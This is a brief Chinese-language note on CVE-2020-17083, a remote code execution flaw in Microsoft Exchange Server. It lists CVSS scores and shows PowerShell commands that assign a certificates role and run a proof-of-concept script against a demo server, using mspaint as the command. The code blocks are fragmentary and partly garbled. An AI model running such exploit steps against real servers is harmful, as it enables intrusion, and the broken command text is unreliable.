## 简介

CVE-2020-17083是存在于Microsoft Exchange服务器中的远程代码执行漏洞。

CVE-2020-17083 CVSS:3.0 5.5/4.8CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L/E:U/RL:O/RC:C

## 利用方式

注意，需要Exchange Server Certificates角色，例如下面的用户  harryh，查看exchange服务器中关于harryh用户的信息

```
[PS] C:\Windows\system32>New-RoleGroup -Name "cert users" -Roles "Exchange Server Certificates" -Members "harryh"

"cert users"

 | Format-List
```

运行如下的命令执行攻击

```
PS C:\Users\researcher> .\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123##-cmd mspaint
###

command

...
```
